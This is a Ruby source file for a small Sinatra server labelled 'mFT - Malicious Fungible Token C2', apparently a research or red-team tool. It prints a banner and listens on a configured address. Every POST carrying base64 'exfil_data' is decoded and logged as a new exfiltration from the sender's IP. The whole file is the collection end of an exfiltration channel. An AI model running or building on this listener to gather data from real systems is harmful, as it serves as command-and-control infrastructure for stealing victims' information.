#!/usr/bin/ruby
#mFT - Malicious Fungible Token C2
#Mauro Eldritch @ Birmingham Cyber Arms LTD - 2023
require_relative 'config.rb'
require 'thin'
require 'base64'
require 'sinatra'
require 'colorize'

def banner()
    bannertext = """
          _____ _____           _ _ _     _   ___    _____ ___ 
    _____|   __|_   _|   ___   | | | |___| |_|_  |  |     |_  |
   |     |   __| | |    |___|  | | | | -_| . |_  |  |   --|  _|
   |_|_|_|__|    |_|           |_____|___|___|___|  |_____|___|
                    mFT - Web3 C2 Server v0.01 - Mauro Eldritch
                           
    """
    puts bannertext.light_green
end

banner()
configure do
    set :environment, :production
    enable :run
    set :bind, $ex_default_address
    set :port, $ex_default_port
    set :show_exceptions, false
    set :server_settings, :timeout => 5000    
    set :server, "thin"
end

get('/') {
    status 200
    "HTTP 200: OK."
}

post('/') {
    status 200
    puts "New exfil from #{request.ip}".light_red
    puts Base64.decode64(params[:exfil_data]).light_green
}